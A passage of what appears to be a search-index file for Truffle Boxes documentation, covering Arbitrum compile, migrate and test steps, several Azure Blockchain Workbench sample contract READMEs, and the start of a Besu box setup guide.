Ethereum in the contracts/ethereum folder.","title":"New Configuration File"},{"location":"boxes/arbitrum/index.html#new-directory-structure-for-artifacts","text":"When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!","title":"New Directory Structure for Artifacts"},{"location":"boxes/arbitrum/index.html#arbitrum","text":"","title":"Arbitrum"},{"location":"boxes/arbitrum/index.html#compiling","text":"To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.arbitrum.js and add the --all flag.","title":"Compiling"},{"location":"boxes/arbitrum/index.html#migrating","text":"To migrate on Arbitrum, run: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) (remember to choose a network from these options!). You have several Arbitrum networks to choose from, prepackaged in this box (note: Layer 1 networks are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): arbitrum_local : This network is the default Layer 1/Layer 2 integration provided by Arbitrum for testing your Arbitrum-compatible code. Documentation about this setup can be found here . You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalArbitrum . You should only need to run this initiation command once. It will create an arbitrum directory in this project that will house the repository you need. If at any point you want to update to the latest Arbitrum docker image, you can delete your arbitrum directory and run this command again. If you'd rather house the Arbitrum local blockchain outside of this box, see these notes for how to get started doing so. If you wish to use this network, follow these steps, in this order: 1) In a new terminal tab, enter npm run startLocalEthereum . 2) Wait for step #1 to complete. The Arbitrum Layer 2 blockchain depends on the existence of a Layer 1 for proper interoperability. 3) In another new terminal tab, enter npm run startLocalArbitrum . Wait a little while, and you will see the Arbitrum blockchain running and interacting with the Layer 1 simulation from step #1! You are ready to try out deploying your contracts! - arbitrum_testnet : Arbitrum has deployed a testnet to the Rinkeby network. The RPC endpoint is https://arbitrum-rinkeby.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as RINKEBY_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. * Currently, we have the gasPrice for transactions on Arbitrum Rinkeby set to zero. You should be able to use this network as configured at this time. * In order to set up your MetaMask wallet to connect to the Arbitrum Rinkeby network, you will need to create a custom RPC network in your wallet. You can find detailed steps for this process here . You will need the following information: - RPC Url: https://arbitrum-rinkeby.infura.io/v3/ + <your infura key> - chain id: 421611 arbitrum_mainnet : This is the mainnet for Arbitrum's Layer 2 solution. You will need to connect your wallet to the Arbitrum mainnet RPC network, located at https://arbitrum-mainnet.infura.io/v3/ Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract. One example is an ERC20 contract that is deployed on an Arbitrum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag.","title":"Migrating"},{"location":"boxes/arbitrum/index.html#basic-commands","text":"The code here will allow you to compile, migrate, and test your code against an Arbitrum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:arbitrum To migrate: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) To test: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet)","title":"Basic Commands"},{"location":"boxes/arbitrum/index.html#testing","text":"Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Remember that there are some differences between Arbitrum and Ethereum, and refer to the Arbitrum documentation if you run into test failures.","title":"Testing"},{"location":"boxes/arbitrum/index.html#communication-between-ethereum-and-arbitrum-chains","text":"The information above should allow you to deploy to an Arbitrum Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Arbitrum integration!","title":"Communication Between Ethereum and Arbitrum Chains"},{"location":"boxes/arbitrum/index.html#support","text":"Support for this box is available via the Truffle community available here .","title":"Support"},{"location":"boxes/azure-asset-transfer/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-asset-transfer-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Asset Transfer Sample for Azure Blockchain Workbench\\n====================================================\\n\\nOverview\\n---------\\n\\nThe asset transfer smart contract covers the scenario for buying and selling\\nhigh value assets, which require an inspector and appraiser. Sellers can list\\ntheir assets by instantiating an asset transfer smart contract. Buyers can make\\noffers by taking an action on the smart contract, and other parties can take\\nactions to inspect or appraise the asset. Once the asset is marked both\\ninspected and appraised, the buyer and seller will confirm the sale again before\\nthe contract is set to complete. At each point in the process, all participants\\nhave visibility into the state of the contract as it is updated.\\n\\n![](https://raw.githubusercontent.com/caleteeter/asset-transfer/master/media/1b35fd81aa303d9030594e43d738a625.jpg)\\n\\nThere are four personas in this demo contract \\xe2\\x80\\x93 the seller as the initiator, and\\nthe other three personas (buyer, appraiser, and inspector) as participants. As\\nindicated in the visual above, at certain stages in the contract, there are\\nvarious actions which participants can take. The logic written in the smart\\ncontract will modify the state accordingly based on which actions are taken.\\n\\n \\n\\nApplication Roles\\n------------------\\n\\n| Name | Description |\\n|------------|-----------------------------------------------------------------------------------------------------|\\n| Seller | A person who owns an asset and wants to sell the asset. |\\n| Buyer | A person who intends to buy the asset being sold by the seller. |\\n| Inspector | A person who is chosen by the buyer to be the inspector of the asset being considered for buying. |\\n| Appraiser | A person who is chosen by the buyer to be the appraiser for the asset being considered for buying. |\\n\\n \\n\\nStates\\n-------\\n\\n| Name | Description |\\n|----------------------|-------------------------------------------------------------------------------------------------------------|\\n| Active | Indicates that an asset is available for being bought. |\\n| Offer Placed | Indicates a buyer's intention to buy. |\\n| Pending Inspection | Indicates a buyer's request to the Inspector to inspect the asset under consideration. |\\n| Inspected | Indicates the Inspector's approval to buy the asset under consideration. |\\n| Appraised | Indicates the Appraiser's approval to buy the asset under consideration. |\\n| Notional Acceptance | Indicates that both the Inspector and the Appraiser have approved buying the asset under consideration. |\\n| Seller Accepted | Indicates the owner's approval to accept the offer made by the buyer. |\\n| Buyer Accepted | Indicates the buyer's approval for the owner's approval. |\\n| Accepted | Indicates that both the buyer and the seller have agreed to the transfer of the asset under consideration. |\\n| Terminated | Indicates owner's disapproval to continue with selling the asset under consideration. |\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![](https://raw.githubusercontent.com/truffle-box/azure-asset-transfer-box/master/media/1a14a6336d8a8b1adfe5c3689ab954b2.png)\\n\\nThe following state transition diagram articulates the possible flows, and the\\nvarious transition functions at each state. Each user is only allowed to take\\ncertain actions depending on the application role. Instance roles indicate that\\nonly the user with the application role assigned to the specific contract is\\nable to take actions on the contract.\\n\\nThe happy path highlighted shows in a given asset transfer contract, an instance\\nowner can place an asset up for sale, and a potential buyer can place an\\noffer.\\xe2\\x80\\xafThe two parties can negotiate and once an offer amount is agreed upon, an\\ninspector and an\\xe2\\x80\\xafappraiser\\xe2\\x80\\xafworking for the instance buyer will\\nparticipate.\\xe2\\x80\\xafAfter their involvement, the buyer and the owner can choose to move\\nforward and ultimately complete the transaction.\\n\\nApplication Files\\n-----------------\\n\\n[AssetTranfer.sol](https://raw.githubusercontent.com/truffle-box/azure-asset-transfer-box/master/contracts/AssetTransfer.sol)\\n\"","title":"Index"},{"location":"boxes/azure-basic-provenance/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-basic-provenance-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Basic Provenance Sample Application for Azure Blockchain Workbench\\n==============================\\n\\nOverview\\n---------\\n\\nThe Basic Provenance application expresses a workflow for a simple record of\\nownership or responsibility. The state transition diagram below shows the\\ninteractions among the states in this workflow.\\n\\n \\n\\nApplication Roles\\n------------------\\n\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n| InitiatingCounterParty | The first participant in the supply chain. |\\n| Counterparty | A party to whom responsibility for a product has been assigned. For example, a shipper |\\n| Owner | The organization that owns the product being transported. For example, a manufacturer |\\n| Observer | The individual or organization monitoring the supply chain. For example, a government agency |\\n\\n\\xc2\\xa0 \\n\\nStates\\n-------\\n\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n|Created |Indicates that the contract has initiated and tracking is in progress. |\\n|InTransit |Indicates that a Counterparty currently is in possession and responsible for goods being transported.|\\n|Completed |Indicates the product has reached it's intended destination.|\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![state diagram of the workflow](https://raw.githubusercontent.com/truffle-box/azure-basic-provenance-box/master/media/c3d3c6764f6ae1e565c0929d2f2fed48.png)\\n\\nAn instance of the Basic Provenance application's workflow starts in the Created\\nstate when an owner wants to begin a process for tracking ownership or\\nresponsibility. An owner is also the InitiatingCounterParty since the owner\\ninitiates the process for tracking the ownership or responsibility. The state\\nchanges to InTransit whenever a new counterparty that can take on the\\nresponsibility is identified. The owner in the InitiatingCounterParty role\\ncalls a function to transfer responsibility by specifying a counterparty. Upon\\nreaching the InTransit state, the counterparty can transfer the responsibility\\nto another counterparty or the owner can decide to complete the transfers of\\nresponsibility and call the Complete function to reach the Completed state.\\n\\nThe happy path shown in the transition diagram traces the owner transferring\\nresponsibility to a counterparty once and then completing the workflow.\\n\\n \\n\\nApplication Files\\n-----------------\\n[BasicProvenance.json](https://raw.githubusercontent.com/truffle-box/azure-basic-provenance-box/master/BasicProvenance.json)\\n\\n[BasicProvenance.sol](https://raw.githubusercontent.com/truffle-box/azure-basic-provenance-box/master/contracts/BasicProvenance.sol)\\n\"","title":"Index"},{"location":"boxes/azure-digital-locker/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-digital-locker-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Digital Locker Sample Application for Azure Blockchain Marketplace\\n==================================================================\\n\\nOverview\\n---------\\n\\nThe Digital Locker application expresses a workflow of sharing digitally locked\\nfiles where the owner of the files controls the access to these files. We\\nillustrate Digital Locker using an example of an owner performing access control\\nto their document held by a bank. The state transition diagram below shows the\\ninteractions among the states in this workflow.\\n\\n \\n\\nApplication Roles\\n------------------\\n\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n| Owner | The owner of the digital asset. |\\n| BankAgent | The keeper of the digital asset. |\\n| ThirdPartyRequestor | A person requesting access to the digital asset. |\\n| CurrentAuthorizedUser | A person authorized to access the digital asset. |\\n\\n \\n\\nStates\\n-------\\n\\n| Requested | Indicates owner's request to make the digital asset available. |\\n|------------------------|------------------------------------------------------------------------------------------------------------|\\n| DocumentReview | Indicates that the bank agent has reviewed the owner's request. |\\n| AvailableToShare | Indicates that the bank agent has uploaded the digital asset and the digital asset is available for sharing |\\n| SharingWithThirdParty | Indicates that the owner is reviewing a third party's request to access the digital asset. |\\n| Terminated | Indicates termination of sharing the digital asset. |\\n\\n \\n\\nWorkflow Details\\n-----------------\\n\\n![state diagram of the workflow](https://raw.githubusercontent.com/caleteeter/digital-locker/master/media/3540f1547a7326c32df839411dfbf0b8.png)\\n\\nAn instance of the Digital Locker application's workflow starts in the Requested\\nstate when an Owner requests their bank to begin a process of sharing a document\\nheld by the bank. A BankAgent causes the state to transition to DocumentReview\\nby calling the function BeginReviewProcess indicating that the process to review\\nthe request has begun. Once the review is complete, the BankAgent then makes\\nthe document available by uploading the documents. The AvailableToShare state\\ncan be thought of a perpetual state, more on this in a bit. Once the document is\\navailable to share, the document can be shared either with a third party that\\nthe owner has identified or any random third-party requestor. If the owner\\nspecifies the third-party requestor, then the state transitions from\\nAvailableToShare to SharingWithThirdParty. If a random third-party requestor\\nneeds access to the document, then that third-party requestor first requests\\naccess to the document. At this point, the owner can either accept the request\\nand grant access or reject the request. If the owner rejects the request to the\\nrandom third-party requestor, then the state goes back to AvailableToShare. If\\nthe owner accepts the request to allow the random third-party request to access\\nthe document, then the state transitions to SharingWithThirdParty. Once the\\nthird-party requestor is done with the document, they can release the lock to\\nthe document and the state transitions to AvailableToShare. The owner can also\\ncause the state to transition from SharingWithThirdParty to AvailableToShare\\nwhen they revoke access from the third-party requestor. Finally, at any time\\nduring these transitions the bank agent can decide to terminate the sharing of\\nthe document once the document becomes available to share.\\xc2\\xa0\\n\\nThe happy path shown in the state transition diagram traces a path where the\\nowner grants access to a random third party.\\n\\n \\n\\nApplication Files\\n-----------------\\n[DigitalLocker.json](https://raw.githubusercontent.com/caleteeter/digital-locker/master/DigitalLocker.json)\\n\\n[DigitalLocker.sol](https://raw.githubusercontent.com/caleteeter/digital-locker/master/contracts/DigitalLocker.sol)\\n\"","title":"Index"},{"location":"boxes/azure-hello-blockchain/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-hello-blockchain-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'Hello Blockchain Sample Application for Azure Blockchain Workbench\\n==================================================================\\n\\nOverview \\n---------\\n\\nThe Hello Blockchain application expresses a workflow between a person sending\\na request and a person responding to the request. The state transition diagram\\nbelow shows the interactions between the states in this workflow. \\n\\n \\n\\nApplication Roles \\n------------------\\n\\n| Name | Description |\\n|------------|-------------------------------------------------------------------------------------------|\\n| __Requestor__ | The party that initiates the \"Hello blockchain!\" request |\\n| __Responder__ | The party that responds to the Requestor |\\n\\n \\n\\nStates \\n-------\\n\\n| Name | Description |\\n|----------|-------------------------------------------------------------------------------------------|\\n| __Request__ | The state that occurs when a request has been made. |\\n| __Respond__ | The state that occurs after a response has been made to the request. |\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![state diagram of workflow](https://raw.githubusercontent.com/caleteeter/hello-blockchain/master/media/5aba06dd9b98e017f7031946d0187fb7.png)\\n \\nAn instance of the Hello Blockchain application\\'s workflow starts in the Request\\nstate when a Requestor makes a request. The instance transitions to the Respond\\nstate when a Responder sends a response. The instance transitions back again to\\nthe Request state when the Requestor makes another request. These transitions\\ncontinue for as long as a Requestor sends a request and a Responder sends a\\nresponse. \\n\\n \\n\\nApplication Files\\n-----------------\\n\\n[HelloBlockchain.json](https://raw.githubusercontent.com/caleteeter/hello-blockchain/master/HelloBlockchain.json)\\n\\n[HelloBlockchain.sol](https://raw.githubusercontent.com/caleteeter/hello-blockchain/master/contracts/HelloBlockchain.sol)\\n'","title":"Index"},{"location":"boxes/azure-refrigerated-transportation/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-refrigerated-transportation-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Refrigerated Transportation Sample Application for Azure Blockchain Workbench\\n=============================================================================\\n\\nOverview\\n----------\\n\\nThe refrigerated transportation smart contract covers a provenance scenario with\\nIoT monitoring. You can think of it as a supply chain transport scenario where\\ncertain compliance rules must be met throughout the duration of the\\ntransportation process. The initiating counterparty specifies the humidity and\\ntemperature range the measurement must fall in to be compliant. At any point, if\\nthe device takes a temperature or humidity measurement that is out of range, the\\ncontract state will be updated to indicate that it is out of compliance.\\n\\n![visualization of supply chain](https://raw.githubusercontent.com/caleteeter/refrigerated-transportation/master/media/59c0d3080fb4ad63b1e64c8496645d3b.png)\\n\\nAll participants can view the state and details of the contract at any point in\\ntime. The counterparty doing the transportation will specify the next\\ncounterparty responsible, and the device will ingest temperature and humidity\\ndata, which gets written to the chain. This allows the Supply Chain Owner and\\nSupply Chain Observer to pinpoint which counterparty did not fulfill the\\ncompliance regulations if at any point in the process either the temperature or\\nhumidity requirements were not met.\\n\\n \\n\\nApplication Roles\\n------------------\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n| InitiatingCounterParty | The first participant in the supply chain. |\\n| Counterparty | A party to whom responsibility for a product has been assigned. For example, a shipper |\\n| Device | A device used to monitor the temperature and humidity of the environment the good(s) are being shipped in.\\n| Owner | The organization that owns the product being transported. For example, a manufacturer |\\n| Observer | The individual or organization monitoring the supply chain. For example, a government agency |\\n\\n \\n\\nStates\\n-------\\n\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n|Created |Indicates that the contract has initiated and tracking is in progress. |\\n|InTransit |Indicates that a Counterparty currently is in possession and responsible for goods being transported.|\\n|Completed |Indicates the product has reached it's intended destination.|\\xc2\\xa0\\n|OutOfCompliance|Indicates that the agreed upon terms for temperature and humidity conditions were not met.|\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![state diagram for the workflow](https://raw.githubusercontent.com/caleteeter/refrigerated-transportation/master/media/73ebae42a69347a7edb762d0f583724a.png)\\n\\nThe following state transition diagram articulates the possible flows, and the\\nvarious transition functions at each state. Each user is only allowed to take\\ncertain actions depending on the application role. Instance roles indicate that\\nonly the user with the application role assigned to the specific contract is\\nable to take actions on the contract.\\n\\nThis contract demonstrates how to collect telemetry information and enforce\\ncontract specifics related to conditions during transport. Specifically,\\nreceiving and evaluating temperature and humidity data against an agreed upon\\nacceptable range. If the IoT device identifies that the telemetry is out of the\\nacceptable range, the contract will shift into an\\xe2\\x80\\xafout of compliance state and\\nappropriate remedies can be sought. In the highlighted happy path, the device\\ningests readings, which are in compliance throughout the transportation process,\\nwhile the involved counterparties transfer responsibility until the\\ntransportation is completed.\\n\\n \\n\\nApplication Files\\n-----------------\\n[RefrigeratedTransportation.json](https://raw.githubusercontent.com/caleteeter/refrigerated-transportation/master/RefrigeratedTransportation.json)\\n\\n[RefrigeratedTransportation.sol](https://raw.githubusercontent.com/caleteeter/refrigerated-transportation/master/contracts/RefrigeratedTransportation.sol)\\n\"","title":"Index"},{"location":"boxes/azure-room-thermostat/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-room-thermostat-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'Room Thermostat Sample Application for Azure Blockchain Workbench\\n====================================================\\n\\nOverview\\n---------\\n\\nThe room thermostat scenario expresses a workflow around thermostat installation and use. In this scenario, a person will install a thermostat and indicate who is the intended user for the thermostat. The assigned user can do things such as set the target temperature and set the mode for the thermostat.\\n\\n \\n\\nApplication Roles\\n------------------\\n\\n| Name | Description |\\n|------------|-----------------------------------------------------------------------------------------------------|\\n| Installer | A person who is responsible for installing the thermostat. |\\n| User | A person who uses the thermostat. |\\n\\n \\n\\nStates\\n-------\\n\\n| Name | Description |\\n|----------------------|-------------------------------------------------------------------------------------------------------------|\\n| Created | Indicates that a thermostat installation has been requested. |\\n| InUse | Indicates that the thermostat is in use. |\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![](https://raw.githubusercontent.com/truffle-box/azure-room-thermostat-box/master/media/roomthermostat.png)\\n\\nThe room thermostat is a simple workflow to demonstrate how to use the enum data type. Once the installer has installed and started the thermostat, the user can take two main actions. As a user, you can set the target temperature to a temperature you specify, or you can set the mode to one of four modes: Off, Cool, Heat, and Auto.\\n\\n \\n\\nApplication Files\\n-----------------\\n[RoomThermostat.sol](https://raw.githubusercontent.com/truffle-box/azure-room-thermostat-box/master/contracts/RoomThermostat.sol)\\n'","title":"Index"},{"location":"boxes/azure-simple-marketplace/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-simple-marketplace-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Simple Marketplace Sample Application for Azure Blockchain Workbench\\n====================================================================\\n\\nOverview\\xc2\\xa0\\n---------\\n\\nThe Simple Marketplace application expresses a workflow for a simple transaction\\nbetween an owner and a buyer in a marketplace.\\xc2\\xa0 The state transition diagram\\nbelow shows the interactions among the states in this workflow.\\xc2\\xa0\\n\\n \\n\\nApplication Roles\\xc2\\xa0\\n------------------\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n|Owner\\xc2\\xa0|A person who wants to sell on the marketplace. |\\n|Buyer\\xc2\\xa0|A person who wants to buy from the marketplace. |\\n\\n \\n\\nStates\\xc2\\xa0\\n-------\\n\\n| Name | Description |\\n|------------------------|---------------------------------------------------|\\n|ItemAvailable\\xc2\\xa0|Indicates that an owner has made the item they want to sell available in the marketplace.\\n|OfferPlaced\\xc2\\xa0|Indicates that a seller has made an offer to buy the item listed by an owner.\\n|Accepted\\xc2\\xa0|Indicates that the owner has accepted the buyer's offer for the item.\\n\\n \\n\\nWorkflow Details\\n----------------\\n\\n![workflow details for application](https://raw.githubusercontent.com/truffle-box/azure-simple-marketplace-box/master/media/a98d6da0441c39cf0e2d82b2f4faaff3.png)\\n\\nAn instance of the Simple Marketplace application's workflow starts in the\\nItemAvailable state when an Owner makes an item available for sale by specifying\\nits description and price.\\xc2\\xa0 A buyer can then make an offer by specifying their\\nprice for the item.\\xc2\\xa0 This action causes the state to change from ItemAvailable\\nto OfferPlaced.\\xc2\\xa0 Now, if the owner agrees to the buyer's offer, then owner calls\\nthe function to accept an offer, and the workflow reaches a successful\\nconclusion state denoted by the Accepted state.\\xc2\\xa0 If the owner, however, is not\\nsatisfied with the offer, then the owner can call the function to reject the\\noffer.\\xc2\\xa0 On rejection, the state changes to ItemAvailable indicating that the\\nitem is still up for sale.\\xc2\\xa0 The transitions between the ItemAvailable and the\\nOfferPlaced states can continue until the owner is satisfied with the offer\\nmade.\\xc2\\xa0\\n\\nA happy path shown in the transition diagram traces an owner making an item\\navailable, a buyer making an offer, and the owner accepting the offer.\\xc2\\xa0\\n\\n \\n\\nApplication Files\\n-----------------\\n\\n[SimpleMarketplace.sol](https://raw.githubusercontent.com/truffle-box/azure-simple-marketplace-box/master/contracts/SimpleMarketplace.sol)\\n\"","title":"Index"},{"location":"boxes/bazaar-item-listing/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS azure-bazaar-item-listing-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"Bazaar - Item Listing Sample Application for Azure Blockchain Workbench\\n====================================================\\n\\nOverview\\xc2\\xa0\\n---------\\n\\nThe Bazaar - Item Listing scenario shows an example of how an application can have more than one workflow and how one contract can deploy another contract.\\nThe Bazaar - Item Listing application has two workflows. The first workflow binds two people through a smart contract. The second workflow lets the two people bound by a smart contract list items that can be bought and sold between themselves. The result of buying and selling an item, such as updating user balances, from the second workflow is reflected in the first workflow.\\xc2\\xa0\\n\\n \\n\\nApplication Roles\\xc2\\xa0\\n------------------\\n\\n| Name | Description |\\n|------------|-----------------------------------------------------------------------------------------------------|\\n| BazaarMaintainer\\xc2\\xa0 | A person who is responsible for pairing or binding two people through a smart contract.\\xc2\\xa0 |\\n| Party\\xc2\\xa0 | A person who is participant in the application. A person in a party role can be a part of one or more bindings, in that can be paired with more than one parties through multiple smart contracts (one smart contract for each pair).\\xc2\\xa0 |\\n\\n \\n\\nBazaar Workflow States\\xc2\\xa0\\n-------\\n\\n| Name | Description |\\n|----------------------|-------------------------------------------------------------------------------------------------------------|\\n| PartyProvisioned | Indicates that two persons in Party roles have been provisioned along with their monetary balance values.\\xc2\\xa0 |\\n| ItemListed\\xc2\\xa0 | Indicates that a party has listed an item in the bazaar.\\xc2\\xa0 |\\n| CurrentSaleFinalized | Indicates that the sale of an item currently listed has been completed.\\xc2\\xa0 |\\n\\n \\n\\nItem Listing Workflow States\\xc2\\xa0\\n-------\\n\\n| Name | Description |\\n|----------------------|-------------------------------------------------------------------------------------------------------------|\\n| ItemAvailable | Indicates that an item is available for buying.\\xc2\\xa0 |\\n| ItemSold\\xc2\\xa0 | Indicates that the item that was available for buying is now sold.\\xc2\\xa0 |\\n \\n\\nWorkflow Details\\n----------------\\n\\n![](https://raw.githubusercontent.com/caleteeter/bazaar-item-listing/master/media/bazaaritemlisting.png)\\n\\nAn instance of the Bazaar - Item Listing application first creates a binding between two users (here Party A and Party B). The two users are bound by a smart contract that tracks their balances (here Party A Balance and Party B Balance). Once the smart contract is created and deployed on the chain, the instance reaches the Party Provisioned state.\\n\\nParty A and Party B, bound by the smart contract, can now begin to buy and sell items between themselves. A party can list the item by calling the transition function List Item in Workflow 1. The List Item function takes in the item name and the item price and calls Workflow 2's constructor with the correct set of arguments. A successful completion of List Item creates an instance of the second workflow and places that workflow instance in the Item Available state. An item that is available can be bought using the Buy Item function. The Buy Item function checks if the buyer has sufficient balance and proceeds to buy the item by way of updating the parties' balances. Now, since the parent contract's address is known, a direct call can be made to the parent contract's Update Balance function. The Update Balance function appropriately updates the balance of the two parties. A successful execution puts the second workflow instance in the Item Sold state and the first workflow instance in the Current Sale Finalized state.\\n\\nThe List Item function is always available to create new items and consequently new instances of the second workflow. The List Item function is available to both parties so that either party can list an item for sale. Please note that the first workflow does not have a final state indicating that the two parties can continue to buy and sell more than one item in the Bazaar. The second workflow, however, does have a final state indicating that an instance of the second workflow captures the sale of exactly one item between the two parties.\\n\\n \\n\\nApplication Files\\n-----------------\\n[BazaarItemListing.json](https://raw.githubusercontent.com/caleteeter/bazaar-item-listing/master/BazaarItemListing.json) : This is the meta-data file and contains information on the two workflows, their properties, functions, and state transition rules.\\n\\nBazaarItemListing.zip: This file contains three solidity files. \\n* [BazaarItemListing.sol](https://raw.githubusercontent.com/caleteeter/bazaar-item-listing/master/contracts/BazaarItemListing.sol\\n) - This file contains the code for Workflow 1 in the diagram, binding two users in a contract. \\n* [ItemListing.sol](https://raw.githubusercontent.com/caleteeter/bazaar-item-listing/master/contracts/ItemListing.sol) - This file contains the code for Workflow 2 in the diagram, buying and selling an item.\\n* [WorkbenchBase.sol](https://raw.githubusercontent.com/caleteeter/bazaar-item-listing/master/contracts/WorkbenchBase.sol) - This file contains the Workbench base class and the event definitions.\\n\"","title":"Index"},{"location":"boxes/besu-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS besu-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Besu-Box\\nTo Be Used as Truffle Box Creating API Endpoints for\\nHyperledger Besu network.\\n\\nWe use a private blockchain for Ethereum BlockChain\\nDevelopment. This personalised blockchain is made with HL Besu Client.\\n\\nThe Smart Contract Written in solidity language\\nis deployed on this Ethereum Permissioned Blockchain. Smart Contract is\\nImmutable hence, once deployed it can\\'t be changed.\\n\\nA truffle box to serve as the foundation of any Truffle and Express.js dApp.\\n\\nThis Box Uses NodeJS(Express JS) to provide API\\nendpoints to the Ethereum Blockchain smart contract so that this\\nsmart contract can be used in Android/iOS Apps as well.\\n\\n**Pre-Requisites**\\n1. [NodeJS](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-16-04)\\n2. [NestJS](https://nestjs.com/)\\n3. [Docker](https://docs.docker.com/get-docker/)\\n4. [Truffle](https://github.com/trufflesuite/truffle)\\n5. [Besu Docker Image](https://besu.hyperledger.org/en/stable/HowTo/Get-Started/Run-Docker-Image/)\\n6. [Curl](https://curl.haxx.se/)\\n\\n**Installation**\\n1. Install Truffle and Nestjs globally\\n```\\nnpm install -g truffle\\nnpm install -g @nestjs/cli\\n```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n```\\ntruffle unbox illuzzig/besu-box\\n```\\n\\n3. For quick, temporary tests this guide uses /tmp/besu/dev/ as mount volumes. Make sure you create the folders first in the root dir\\n```\\nmkdir -p /tmp/besu/dev/\\n```\\n\\n4. To run a node that mines blocks at a rate suitable for testing purposes\\n```javascript\\n// in another terminal (i.e. not in the truffle develop prompt)\\n// ensure you are inside the app directory when running this\\nnpm run besu:docker\\n```\\n\\n5. Now you can deploy your smart contracts. \\n```javascript\\n// in another 